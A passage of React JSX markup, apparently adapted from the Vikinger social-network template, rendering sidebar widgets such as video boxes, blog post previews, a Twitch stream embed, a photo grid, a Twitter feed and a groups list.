                      {/* VIDEO BOX */}
                      <div className="video-box small">
                        {/* VIDEO BOX COVER */}
                        <div className="video-box-cover popup-video-trigger">
                          {/* VIDEO BOX COVER IMAGE */}
                          <figure className="video-box-cover-image liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/09.jpg\") center center / cover no-repeat"}}>
                            <img src="https://odindesignthemes.com/vikinger/img/cover/09.jpg" alt="cover-09" style={{"display":"none"}} />
                          </figure>
                          {/* /VIDEO BOX COVER IMAGE */}
                          {/* PLAY BUTTON */}
                          <div className="play-button">
                            {/* PLAY BUTTON ICON */}
                            <svg className="play-button-icon icon-play">
                              <use xlinkHref="#svg-play" />
                            </svg>
                            {/* /PLAY BUTTON ICON */}
                          </div>
                          {/* /PLAY BUTTON */}
                          {/* VIDEO BOX INFO */}
                          <div className="video-box-info">
                            {/* VIDEO BOX TITLE */}
                            <p className="video-box-title">Sunset Cowboys - Walkthrough</p>
                            {/* /VIDEO BOX TITLE */}
                            {/* VIDEO BOX TEXT */}
                            <p className="video-box-text">3 days ago</p>
                            {/* /VIDEO BOX TEXT */}
                          </div>
                          {/* /VIDEO BOX INFO */}
                        </div>
                        {/* /VIDEO BOX COVER */}
                      </div>
                      {/* /VIDEO BOX */}
                      {/* VIDEO BOX */}
                      <div className="video-box small">
                        {/* VIDEO BOX COVER */}
                        <div className="video-box-cover popup-video-trigger">
                          {/* VIDEO BOX COVER IMAGE */}
                          <figure className="video-box-cover-image liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/05.jpg\") center center / cover no-repeat"}}>
                            <img src="https://odindesignthemes.com/vikinger/img/cover/05.jpg" alt="cover-05" style={{"display":"none"}} />
                          </figure>
                          {/* /VIDEO BOX COVER IMAGE */}
                          {/* PLAY BUTTON */}
                          <div className="play-button">
                            {/* PLAY BUTTON ICON */}
                            <svg className="play-button-icon icon-play">
                              <use xlinkHref="#svg-play" />
                            </svg>
                            {/* /PLAY BUTTON ICON */}
                          </div>
                          {/* /PLAY BUTTON */}
                          {/* VIDEO BOX INFO */}
                          <div className="video-box-info">
                            {/* VIDEO BOX TITLE */}
                            <p className="video-box-title">Quest of the Ogre II: The Revenge USA...</p>
                            {/* /VIDEO BOX TITLE */}
                            {/* VIDEO BOX TEXT */}
                            <p className="video-box-text">5 days ago</p>
                            {/* /VIDEO BOX TEXT */}
                          </div>
                          {/* /VIDEO BOX INFO */}
                        </div>
                        {/* /VIDEO BOX COVER */}
                      </div>
                      {/* /VIDEO BOX */}
                    </div>
                    {/* /VIDEO BOX LIST */}
                  </div>
                  {/* WIDGET BOX CONTENT */}
                </div>
                {/* /WIDGET BOX */}
                {/* WIDGET BOX */}
                <div className="widget-box">
                  {/* WIDGET BOX SETTINGS */}
                  <div className="widget-box-settings">
                    {/* POST SETTINGS WRAP */}
                    <div className="post-settings-wrap" style={{"position":"relative"}}>
                      {/* POST SETTINGS */}
                      <div className="post-settings widget-box-post-settings-dropdown-trigger">
                        {/* POST SETTINGS ICON */}
                        <svg className="post-settings-icon icon-more-dots">
                          <use xlinkHref="#svg-more-dots" />
                        </svg>
                        {/* /POST SETTINGS ICON */}
                      </div>
                      {/* /POST SETTINGS */}
                      {/* SIMPLE DROPDOWN */}
                      <div className="simple-dropdown widget-box-post-settings-dropdown" style={{"position":"absolute","z-index":"9999","top":"30px","right":"9px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, -20px)","-ms-transform":"translate(0px, -20px)","transform":"translate(0px, -20px)","-webkit-transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s","transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s"}}>
                        {/* SIMPLE DROPDOWN LINK */}
                        <p className="simple-dropdown-link">Widget Settings</p>
                        {/* /SIMPLE DROPDOWN LINK */}
                      </div>
                      {/* /SIMPLE DROPDOWN */}
                    </div>
                    {/* /POST SETTINGS WRAP */}
                  </div>
                  {/* /WIDGET BOX SETTINGS */}
                  {/* WIDGET BOX TITLE */}
                  <p className="widget-box-title">Blog Posts <span className="highlighted">5</span></p>
                  {/* /WIDGET BOX TITLE */}
                  {/* WIDGET BOX CONTENT */}
                  <div className="widget-box-content">
                    {/* POST PEEK LIST */}
                    <div className="post-peek-list">
                      {/* POST PEEK */}
                      <div className="post-peek">
                        {/* POST PEEK IMAGE */}
                        <a className="post-peek-image" href="profile-post.html">
                          <figure className="picture small round liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/19.jpg\") center center / cover no-repeat"}}>
                            <img src="https://odindesignthemes.com/vikinger/img/cover/19.jpg" alt="cover-19" style={{"display":"none"}} />
                          </figure>
                        </a>
                        {/* /POST PEEK IMAGE */}
                        {/* POST PEEK TITLE */}
                        <p className="post-peek-title"><a href="profile-post.html">Here's the how and why did I became a full time Gaming Streamer</a></p>
                        {/* /POST PEEK TITLE */}
                        {/* POST PEEK TEXT */}
                        <p className="post-peek-text">6 days ago</p>
                        {/* /POST PEEK TEXT */}
                      </div>
                      {/* /POST PEEK */}
                      {/* POST PEEK */}
                      <div className="post-peek">
                        {/* POST PEEK IMAGE */}
                        <a className="post-peek-image" href="profile-post.html">
                          <figure className="picture small round liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/10.jpg\") center center / cover no-repeat"}}>
                            <img src="https://odindesignthemes.com/vikinger/img/cover/10.jpg" alt="cover-10" style={{"display":"none"}} />
                          </figure>
                        </a>
                        {/* /POST PEEK IMAGE */}
                        {/* POST PEEK TITLE */}
                        <p className="post-peek-title"><a href="profile-post.html">I spoke with the developers of RoBot SaMurai II at the 2019 GamingCon</a></p>
                        {/* /POST PEEK TITLE */}
                        {/* POST PEEK TEXT */}
                        <p className="post-peek-text">3 weeks ago</p>
                        {/* /POST PEEK TEXT */}
                      </div>
                      {/* /POST PEEK */}
                      {/* POST PEEK */}
                      <div className="post-peek">
                        {/* POST PEEK IMAGE */}
                        <a className="post-peek-image" href="profile-post.html">
                          <figure className="picture small round liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/20.jpg\") center center / cover no-repeat"}}>
                            <img src="https://odindesignthemes.com/vikinger/img/cover/20.jpg" alt="cover-20" style={{"display":"none"}} />
                          </figure>
                        </a>
                        {/* /POST PEEK IMAGE */}
                        {/* POST PEEK TITLE */}
                        <p className="post-peek-title"><a href="profile-post.html">I will be at this month's StreamCon with NekoBebop</a></p>
                        {/* /POST PEEK TITLE */}
                        {/* POST PEEK TEXT */}
                        <p className="post-peek-text">4 weeks ago</p>
                        {/* /POST PEEK TEXT */}
                      </div>
                      {/* /POST PEEK */}
                      {/* POST PEEK */}
                      <div className="post-peek">
                        {/* POST PEEK IMAGE */}
                        <a className="post-peek-image" href="profile-post.html">
                          <figure className="picture small round liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/06.jpg\") center center / cover no-repeat"}}>
                            <img src="https://odindesignthemes.com/vikinger/img/cover/06.jpg" alt="cover-06" style={{"display":"none"}} />
                          </figure>
                        </a>
                        {/* /POST PEEK IMAGE */}
                        {/* POST PEEK TITLE */}
                        <p className="post-peek-title"><a href="profile-post.html">[Exclusive!] Check out all the new missions and story of the Fire Witch DLC!</a></p>
                        {/* /POST PEEK TITLE */}
                        {/* POST PEEK TEXT */}
                        <p className="post-peek-text">1 month ago</p>
                        {/* /POST PEEK TEXT */}
                      </div>
                      {/* /POST PEEK */}
                      {/* POST PEEK */}
                      <div className="post-peek">
                        {/* POST PEEK IMAGE */}
                        <a className="post-peek-image" href="profile-post.html">
                          <figure className="picture small round liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/07.jpg\") center center / cover no-repeat"}}>
                            <img src="https://odindesignthemes.com/vikinger/img/cover/07.jpg" alt="cover-07" style={{"display":"none"}} />
                          </figure>
                        </a>
                        {/* /POST PEEK IMAGE */}
                        {/* POST PEEK TITLE */}
                        <p className="post-peek-title"><a href="profile-post.html">Old Super Mochi's Island is getting a remake!</a></p>
                        {/* /POST PEEK TITLE */}
                        {/* POST PEEK TEXT */}
                        <p className="post-peek-text">1 month ago</p>
                        {/* /POST PEEK TEXT */}
                      </div>
                      {/* /POST PEEK */}
                    </div>
                    {/* /POST PEEK LIST */}
                  </div>
                  {/* /WIDGET BOX CONTENT */}
                </div>
                {/* /WIDGET BOX */}
              </div>
              {/* /GRID COLUMN */}
              {/* GRID COLUMN */}
              <div className="grid-column">
                {this.renderComponent(<Posts {...this.state}/>, <Posts posts={this.state.posts}/>, this.state.loggedIn)} 
                <Loader/>
              </div>
              {/* /GRID COLUMN */}
              {/* GRID COLUMN */}
              <div className="grid-column">
                {/* WIDGET BOX */}
                <div className="widget-box no-padding">
                  {/* WIDGET BOX SETTINGS */}
                  <div className="widget-box-settings">
                    {/* POST SETTINGS WRAP */}
                    <div className="post-settings-wrap" style={{"position":"relative"}}>
                      {/* POST SETTINGS */}
                      <div className="post-settings widget-box-post-settings-dropdown-trigger">
                        {/* POST SETTINGS ICON */}
                        <svg className="post-settings-icon icon-more-dots">
                          <use xlinkHref="#svg-more-dots" />
                        </svg>
                        {/* /POST SETTINGS ICON */}
                      </div>
                      {/* /POST SETTINGS */}
                      {/* SIMPLE DROPDOWN */}
                      <div className="simple-dropdown widget-box-post-settings-dropdown" style={{"position":"absolute","z-index":"9999","top":"30px","right":"9px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, -20px)","-ms-transform":"translate(0px, -20px)","transform":"translate(0px, -20px)","-webkit-transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s","transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s"}}>
                        {/* SIMPLE DROPDOWN LINK */}
                        <p className="simple-dropdown-link">Widget Settings</p>
                        {/* /SIMPLE DROPDOWN LINK */}
                      </div>
                      {/* /SIMPLE DROPDOWN */}
                    </div>
                    {/* /POST SETTINGS WRAP */}
                  </div>
                  {/* /WIDGET BOX SETTINGS */}
                  {/* WIDGET BOX TITLE */}
                  <p className="widget-box-title">Stream Box</p>
                  {/* /WIDGET BOX TITLE */}
                  {/* WIDGET BOX CONTENT */}
                  <div className="widget-box-content small-margin-top">
                    {/* STREAM BOX */}
                    <div className="stream-box no-video-radius">
                      {/* STREAM BOX VIDEO */}
                      <div className="stream-box-video">
                        <iframe src="https://player.twitch.tv/?channel=cohhcarnage&parent=odindesignthemes.com" allowFullScreen />
                      </div>
                      {/* /STREAM BOX VIDEO */}
                      {/* STREAM BOX IMAGE */}
                      <div className="stream-box-image">
                        <figure className="picture tiny circle liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/avatar/01-social.png\") center center / cover no-repeat"}}>
                          <img src="https://odindesignthemes.com/vikinger/img/avatar/01-social.png" alt="avatar-01-social" style={{"display":"none"}} />
                        </figure>
                      </div>
                      {/* /STREAM BOX IMAGE */}
                      {/* STREAM BOX INFO */}
                      <div className="stream-box-info">
                        {/* STREAM BOX TITLE */}
                        <p className="stream-box-title"><a href="profile-stream.html">I'm Playing Athena’s Goddess Story...</a></p>
                        {/* /STREAM BOX TITLE */}
                        {/* STREAM BOX TEXT */}
                        <p className="stream-box-text"><a href="https://www.twitch.tv/" target="_blank">@GameHuntress</a></p>
                        {/* /STREAM BOX TEXT */}
                      </div>
                      {/* /STREAM BOX INFO */}
                    </div>
                    {/* /STREAM BOX */}
                  </div>
                  {/* WIDGET BOX CONTENT */}
                </div>
                {/* /WIDGET BOX */}
                {/* WIDGET BOX */}
                <div className="widget-box">
                  {/* WIDGET BOX SETTINGS */}
                  <div className="widget-box-settings">
                    {/* POST SETTINGS WRAP */}
                    <div className="post-settings-wrap" style={{"position":"relative"}}>
                      {/* POST SETTINGS */}
                      <div className="post-settings widget-box-post-settings-dropdown-trigger">
                        {/* POST SETTINGS ICON */}
                        <svg className="post-settings-icon icon-more-dots">
                          <use xlinkHref="#svg-more-dots" />
                        </svg>
                        {/* /POST SETTINGS ICON */}
                      </div>
                      {/* /POST SETTINGS */}
                      {/* SIMPLE DROPDOWN */}
                      <div className="simple-dropdown widget-box-post-settings-dropdown" style={{"position":"absolute","z-index":"9999","top":"30px","right":"9px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, -20px)","-ms-transform":"translate(0px, -20px)","transform":"translate(0px, -20px)","-webkit-transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s","transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s"}}>
                        {/* SIMPLE DROPDOWN LINK */}
                        <p className="simple-dropdown-link">Widget Settings</p>
                        {/* /SIMPLE DROPDOWN LINK */}
                      </div>
                      {/* /SIMPLE DROPDOWN */}
                    </div>
                    {/* /POST SETTINGS WRAP */}
                  </div>
                  {/* /WIDGET BOX SETTINGS */}
                  {/* WIDGET BOX TITLE */}
                  <p className="widget-box-title">Photos <span className="highlighted">74</span></p>
                  {/* /WIDGET BOX TITLE */}
                  {/* WIDGET BOX CONTENT */}
                  <div className="widget-box-content">
                    {/* PICTURE ITEM LIST */}
                    <div className="picture-item-list small">
                      {/* PICTURE ITEM */}
                      <div className="picture-item">
                        {/* PICTURE */}
                        <figure className="picture round liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/avatar/01.jpg\") center center / cover no-repeat"}}>
                          <img src="https://odindesignthemes.com/vikinger/img/avatar/01.jpg" alt="avatar-01" style={{"display":"none"}} />
                        </figure>
                        {/* /PICTURE */}
                      </div>
                      {/* /PICTURE ITEM */}
                      {/* PICTURE ITEM */}
                      <div className="picture-item">
                        {/* PICTURE */}
                        <figure className="picture round liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/10.jpg\") center center / cover no-repeat"}}>
                          <img src="https://odindesignthemes.com/vikinger/img/cover/10.jpg" alt="avatar-10" style={{"display":"none"}} />
                        </figure>
                        {/* /PICTURE */}
                      </div>
                      {/* /PICTURE ITEM */}
                      {/* PICTURE ITEM */}
                      <div className="picture-item">
                        {/* PICTURE */}
                        <figure className="picture round liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/12.jpg\") center center / cover no-repeat"}}>
                          <img src="https://odindesignthemes.com/vikinger/img/cover/12.jpg" alt="avatar-12" style={{"display":"none"}} />
                        </figure>
                        {/* /PICTURE */}
                      </div>
                      {/* /PICTURE ITEM */}
                      {/* PICTURE ITEM */}
                      <div className="picture-item">
                        {/* PICTURE */}
                        <figure className="picture round liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/02.jpg\") center center / cover no-repeat"}}>
                          <img src="https://odindesignthemes.com/vikinger/img/cover/02.jpg" alt="avatar-02" style={{"display":"none"}} />
                        </figure>
                        {/* /PICTURE */}
                      </div>
                      {/* /PICTURE ITEM */}
                      {/* PICTURE ITEM */}
                      <div className="picture-item">
                        {/* PICTURE */}
                        <figure className="picture round liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/06.jpg\") center center / cover no-repeat"}}>
                          <img src="https://odindesignthemes.com/vikinger/img/cover/06.jpg" alt="avatar-06" style={{"display":"none"}} />
                        </figure>
                        {/* /PICTURE */}
                      </div>
                      {/* /PICTURE ITEM */}
                      {/* PICTURE ITEM */}
                      <div className="picture-item">
                        {/* PICTURE */}
                        <figure className="picture round liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/13.jpg\") center center / cover no-repeat"}}>
                          <img src="https://odindesignthemes.com/vikinger/img/cover/13.jpg" alt="avatar-13" style={{"display":"none"}} />
                        </figure>
                        {/* /PICTURE */}
                      </div>
                      {/* /PICTURE ITEM */}
                      {/* PICTURE ITEM */}
                      <div className="picture-item">
                        {/* PICTURE */}
                        <figure className="picture round liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/04.jpg\") center center / cover no-repeat"}}>
                          <img src="https://odindesignthemes.com/vikinger/img/cover/04.jpg" alt="avatar-04" style={{"display":"none"}} />
                        </figure>
                        {/* /PICTURE */}
                      </div>
                      {/* /PICTURE ITEM */}
                      {/* PICTURE ITEM */}
                      <div className="picture-item">
                        {/* PICTURE */}
                        <figure className="picture round liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/15.jpg\") center center / cover no-repeat"}}>
                          <img src="https://odindesignthemes.com/vikinger/img/cover/15.jpg" alt="avatar-15" style={{"display":"none"}} />
                        </figure>
                        {/* /PICTURE */}
                      </div>
                      {/* /PICTURE ITEM */}
                      {/* PICTURE ITEM */}
                      <div className="picture-item">
                        {/* PICTURE */}
                        <figure className="picture round liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/11.jpg\") center center / cover no-repeat"}}>
                          <img src="https://odindesignthemes.com/vikinger/img/cover/11.jpg" alt="avatar-11" style={{"display":"none"}} />
                        </figure>
                        {/* /PICTURE */}
                      </div>
                      {/* /PICTURE ITEM */}
                      {/* PICTURE ITEM */}
                      <div className="picture-item">
                        {/* PICTURE */}
                        <figure className="picture round liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/08.jpg\") center center / cover no-repeat"}}>
                          <img src="https://odindesignthemes.com/vikinger/img/cover/08.jpg" alt="avatar-08" style={{"display":"none"}} />
                        </figure>
                        {/* /PICTURE */}
                      </div>
                      {/* /PICTURE ITEM */}
                      {/* PICTURE ITEM */}
                      <div className="picture-item">
                        {/* PICTURE */}
                        <figure className="picture round liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/16.jpg\") center center / cover no-repeat"}}>
                          <img src="https://odindesignthemes.com/vikinger/img/cover/16.jpg" alt="avatar-16" style={{"display":"none"}} />
                        </figure>
                        {/* /PICTURE */}
                      </div>
                      {/* /PICTURE ITEM */}
                      {/* PICTURE ITEM */}
                      <a className="picture-item" href="profile-photos.html">
                        {/* PICTURE */}
                        <figure className="picture round liquid" style={{"background":"url(\"https://odindesignthemes.com/vikinger/img/cover/17.jpg\") center center / cover no-repeat"}}>
                          <img src="https://odindesignthemes.com/vikinger/img/cover/17.jpg" alt="avatar-17" style={{"display":"none"}} />
                        </figure>
                        {/* /PICTURE */}
                        {/* PICTURE ITEM OVERLAY */}
                        <div className="picture-item-overlay round">
                          {/* PICTURE ITEM OVERLAY TEXT */}
                          <p className="picture-item-overlay-text">+61</p>
                          {/* /PICTURE ITEM OVERLAY TEXT */}
                        </div>
                        {/* /PICTURE ITEM OVERLAY */}
                      </a>
                      {/* /PICTURE ITEM */}
                    </div>
                    {/* /PICTURE ITEM LIST */}
                  </div>
                  {/* /WIDGET BOX CONTENT */}
                </div>
                {/* /WIDGET BOX */}
                {/* WIDGET BOX */}
                <div className="widget-box">
                  {/* WIDGET BOX SETTINGS */}
                  <div className="widget-box-settings">
                    {/* POST SETTINGS WRAP */}
                    <div className="post-settings-wrap" style={{"position":"relative"}}>
                      {/* POST SETTINGS */}
                      <div className="post-settings widget-box-post-settings-dropdown-trigger">
                        {/* POST SETTINGS ICON */}
                        <svg className="post-settings-icon icon-more-dots">
                          <use xlinkHref="#svg-more-dots" />
                        </svg>
                        {/* /POST SETTINGS ICON */}
                      </div>
                      {/* /POST SETTINGS */}
                      {/* SIMPLE DROPDOWN */}
                      <div className="simple-dropdown widget-box-post-settings-dropdown" style={{"position":"absolute","z-index":"9999","top":"30px","right":"9px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, -20px)","-ms-transform":"translate(0px, -20px)","transform":"translate(0px, -20px)","-webkit-transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s","transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s"}}>
                        {/* SIMPLE DROPDOWN LINK */}
                        <p className="simple-dropdown-link">Widget Settings</p>
                        {/* /SIMPLE DROPDOWN LINK */}
                      </div>
                      {/* /SIMPLE DROPDOWN */}
                    </div>
                    {/* /POST SETTINGS WRAP */}
                  </div>
                  {/* /WIDGET BOX SETTINGS */}
                  {/* WIDGET BOX TITLE */}
                  <p className="widget-box-title">Twitter Feed</p>
                  {/* /WIDGET BOX TITLE */}
                  {/* WIDGET BOX CONTENT */}
                  <div className="widget-box-content">
                    {/* TWEET FEED */}
                    <div className="tweet-feed"><div className="tweets"><div className="tweet"><a className="tweet-author" href="https://twitter.com/odindesign_tw" target="_blank"><figure className="tweet-author-image picture tiny circle liquid" style={{"background":"url(\"https://pbs.twimg.com/profile_images/1346071352189530113/B_k1S9kk_normal.png\") center center / cover no-repeat"}}><img src="https://pbs.twimg.com/profile_images/1346071352189530113/B_k1S9kk_normal.png" style={{"display":"none"}} /></figure><p className="tweet-author-title">Odin Design</p><p className="tweet-author-text">@odindesign_tw</p></a><a className="tweet-text" href="https://t.co/nQn1XU0xn7" target="_blank"><span className="highlighted">@bswagz88</span> Hi Brandon, sorry, but it's taking a little longer than expected because we're adding new things, like me… https://t.co/nQn1XU0xn7</a><p className="tweet-timestamp">1 month ago</p></div><div className="tweet"><a className="tweet-author" href="https://twitter.com/odindesign_tw" target="_blank"><figure className="tweet-author-image picture tiny circle liquid" style={{"background":"url(\"https://pbs.twimg.com/profile_images/1346071352189530113/B_k1S9kk_normal.png\") center center / cover no-repeat"}}><img src="https://pbs.twimg.com/profile_images/1346071352189530113/B_k1S9kk_normal.png" style={{"display":"none"}} /></figure><p className="tweet-author-title">Odin Design</p><p className="tweet-author-text">@odindesign_tw</p></a><a className="tweet-text" href="https://twitter.com/odindesign_tw" target="_blank">RT @danfisher_dev: 🔥 Black Friday Sale! From now until Monday, November 29, we’re offering 30% off on all our items as part of our Black Fr…</a><p className="tweet-timestamp">2 months ago</p></div><div className="tweet"><a className="tweet-author" href="https://twitter.com/odindesign_tw" target="_blank"><figure className="tweet-author-image picture tiny circle liquid" style={{"background":"url(\"https://pbs.twimg.com/profile_images/1346071352189530113/B_k1S9kk_normal.png\") center center / cover no-repeat"}}><img src="https://pbs.twimg.com/profile_images/1346071352189530113/B_k1S9kk_normal.png" style={{"display":"none"}} /></figure><p className="tweet-author-title">Odin Design</p><p className="tweet-author-text">@odindesign_tw</p></a><a className="tweet-text" href="https://t.co/Ql6LloAVdE" target="_blank">INTRO PRICE LAST DAYS!!! for the Cryptoki HTML template!! Hurry up and get your copy HERE: https://t.co/Ql6LloAVdE… https://t.co/PPP9fh6E9l</a><p className="tweet-timestamp">2 months ago</p></div></div></div>
                    {/* /TWEET FEED */}
                  </div>
                  {/* /WIDGET BOX CONTENT */}
                </div>
                {/* /WIDGET BOX */}
                {/* WIDGET BOX */}
                <div className="widget-box">
                  {/* WIDGET BOX SETTINGS */}
                  <div className="widget-box-settings">
                    {/* POST SETTINGS WRAP */}
                    <div className="post-settings-wrap" style={{"position":"relative"}}>
                      {/* POST SETTINGS */}
                      <div className="post-settings widget-box-post-settings-dropdown-trigger">
                        {/* POST SETTINGS ICON */}
                        <svg className="post-settings-icon icon-more-dots">
                          <use xlinkHref="#svg-more-dots" />
                        </svg>
                        {/* /POST SETTINGS ICON */}
                      </div>
                      {/* /POST SETTINGS */}
                      {/* SIMPLE DROPDOWN */}
                      <div className="simple-dropdown widget-box-post-settings-dropdown" style={{"position":"absolute","z-index":"9999","top":"30px","right":"9px","opacity":"0","visibility":"hidden","-webkit-transform":"translate(0px, -20px)","-ms-transform":"translate(0px, -20px)","transform":"translate(0px, -20px)","-webkit-transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s","transition":"transform 0.3s ease-in-out 0s, opacity 0.3s ease-in-out 0s, visibility 0.3s ease-in-out 0s"}}>
                        {/* SIMPLE DROPDOWN LINK */}
                        <p className="simple-dropdown-link">Widget Settings</p>
                        {/* /SIMPLE DROPDOWN LINK */}
                      </div>
                      {/* /SIMPLE DROPDOWN */}
                    </div>
                    {/* /POST SETTINGS WRAP */}
                  </div>
                  {/* /WIDGET BOX SETTINGS */}
                  {/* WIDGET BOX TITLE */}
                  <p className="widget-box-title">Groups <span className="highlighted">7</span></p>
                  {/* /WIDGET BOX TITLE */}
                  {/* WIDGET BOX CONTENT */}
                  <div className="widget-box-content">
                    {/* FILTERS */}
                    <div className="filters">
                      {/* FILTER */}
                      <p className="filter">Newest</p>
                      {/* /FILTER */}
                      {/* FILTER */}
                      <p className="filter active">Popular</p>
                      {/* /FILTER */}
                      {/* FILTER */}
                      <p className="filter">Active</p>
                      {/* /FILTER */}
                    </div>
                    {/* /FILTERS */}
                    {/* USER STATUS LIST */}
                    <div className="user-status-list">
                      {/* USER STATUS */}
                      <div className="user-status request-small">
                        {/* USER STATUS AVATAR */}
                        <a className="user-status-avatar" href="group-timeline.html">
                          {/* USER AVATAR */}
                          <div className="user-avatar small no-border">
                            {/* USER AVATAR CONTENT */}
                            <div className="user-avatar-content">
                              {/* HEXAGON */}
                              <div className="hexagon-image-40-44" data-src="https://odindesignthemes.com/vikinger/img/avatar/29.jpg" style={{"width":"40px","height":"44px","position":"relative"}}><canvas width={40} height={44} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR CONTENT */}
                          </div>
                          {/* /USER AVATAR */}
                        </a>
                        {/* /USER STATUS AVATAR */}
                        {/* USER STATUS TITLE */}
                        <p className="user-status-title"><a className="bold" href="group-timeline.html">Twitch Streamers</a></p>
                        {/* /USER STATUS TITLE */}
                        {/* USER STATUS TEXT */}
                        <p className="user-status-text small">265 members</p>
                        {/* /USER STATUS TEXT */}
                        {/* ACTION REQUEST LIST */}
                        <div className="action-request-list">
                          {/* ACTION REQUEST */}
                          <div className="action-request accept">
                            {/* ACTION REQUEST ICON */}
                            <svg className="action-request-icon icon-join-group">
                              <use xlinkHref="#svg-join-group" />
                            </svg>
                            {/* /ACTION REQUEST ICON */}
                          </div>
                          {/* /ACTION REQUEST */}
                        </div>
                        {/* ACTION REQUEST LIST */}
                      </div>
                      {/* /USER STATUS */}
                      {/* USER STATUS */}
                      <div className="user-status request-small">
                        {/* USER STATUS AVATAR */}
                        <a className="user-status-avatar" href="group-timeline.html">
                          {/* USER AVATAR */}
                          <div className="user-avatar small no-border">
                            {/* USER AVATAR CONTENT */}
                            <div className="user-avatar-content">
                              {/* HEXAGON */}
                              <div className="hexagon-image-40-44" data-src="https://odindesignthemes.com/vikinger/img/avatar/24.jpg" style={{"width":"40px","height":"44px","position":"relative"}}><canvas width={40} height={44} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR CONTENT */}
                          </div>
                          {/* /USER AVATAR */}
                        </a>
                        {/* /USER STATUS AVATAR */}
                        {/* USER STATUS TITLE */}
                        <p className="user-status-title"><a className="bold" href="group-timeline.html">Cosplayers of the World</a></p>
                        {/* /USER STATUS TITLE */}
                        {/* USER STATUS TEXT */}
                        <p className="user-status-text small">139 members</p>
                        {/* /USER STATUS TEXT */}
                        {/* ACTION REQUEST LIST */}
                        <div className="action-request-list">
                          {/* ACTION REQUEST */}
                          <div className="action-request accept">
                            {/* ACTION REQUEST ICON */}
                            <svg className="action-request-icon icon-join-group">
                              <use xlinkHref="#svg-join-group" />
                            </svg>
                            {/* /ACTION REQUEST ICON */}
                          </div>
                          {/* /ACTION REQUEST */}
                        </div>
                        {/* ACTION REQUEST LIST */}
                      </div>
                      {/* /USER STATUS */}
                      {/* USER STATUS */}
                      <div className="user-status request-small">
                        {/* USER STATUS AVATAR */}
                        <a className="user-status-avatar" href="group-timeline.html">
                          {/* USER AVATAR */}
                          <div className="user-avatar small no-border">
                            {/* USER AVATAR CONTENT */}
                            <div className="user-avatar-content">
                              {/* HEXAGON */}
                              <div className="hexagon-image-40-44" data-src="https://odindesignthemes.com/vikinger/img/avatar/25.jpg" style={{"width":"40px","height":"44px","position":"relative"}}><canvas width={40} height={44} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR CONTENT */}
                          </div>
                          {/* /USER AVATAR */}
                        </a>
                        {/* /USER STATUS AVATAR */}
                        {/* USER STATUS TITLE */}
                        <p className="user-status-title"><a className="bold" href="group-timeline.html">Stream Designers</a></p>
                        {/* /USER STATUS TITLE */}
                        {/* USER STATUS TEXT */}
                        <p className="user-status-text small">466 members</p>
                        {/* /USER STATUS TEXT */}
                        {/* ACTION REQUEST LIST */}
                        <div className="action-request-list">
                          {/* ACTION REQUEST */}
                          <div className="action-request accept">
                            {/* ACTION REQUEST ICON */}
                            <svg className="action-request-icon icon-join-group">
                              <use xlinkHref="#svg-join-group" />
                            </svg>
                            {/* /ACTION REQUEST ICON */}
                          </div>
                          {/* /ACTION REQUEST */}
                        </div>
                        {/* ACTION REQUEST LIST */}
                      </div>
                      {/* /USER STATUS */}
                      {/* USER STATUS */}
                      <div className="user-status request-small">
                        {/* USER STATUS AVATAR */}
                        <a className="user-status-avatar" href="group-timeline.html">
                          {/* USER AVATAR */}
                          <div className="user-avatar small no-border">
                            {/* USER AVATAR CONTENT */}
                            <div className="user-avatar-content">
                              {/* HEXAGON */}
                              <div className="hexagon-image-40-44" data-src="https://odindesignthemes.com/vikinger/img/avatar/28.jpg" style={{"width":"40px","height":"44px","position":"relative"}}><canvas width={40} height={44} style={{"position":"absolute","top":"0px","left":"0px"}} /></div>
                              {/* /HEXAGON */}
                            </div>
                            {/* /USER AVATAR CONTENT */}
                          </div>
                          {/* /USER AVATAR */}
                        </a>
